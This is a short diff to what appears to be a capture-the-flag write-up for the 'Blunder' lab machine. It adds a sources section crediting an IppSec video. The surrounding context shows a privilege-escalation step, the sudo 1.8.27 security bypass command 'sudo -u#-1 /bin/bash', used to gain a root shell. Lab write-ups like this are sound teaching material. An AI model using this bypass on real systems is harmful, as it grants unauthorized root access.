@@ -90,3 +90,7 @@ There is a exploit in exploit-db:
 `sudo 1.8.27 - Security Bypass`
 `sudo -u#-1 /bin/bash`
 Then we can get the root shell.
+
+## Fuentes / Sources
+
+- [IppSec: Blunder (video)](https://youtube.com/watch?v=G5iw8c2vXuk) - IppSec - fecha de acceso: 2026-09-24.
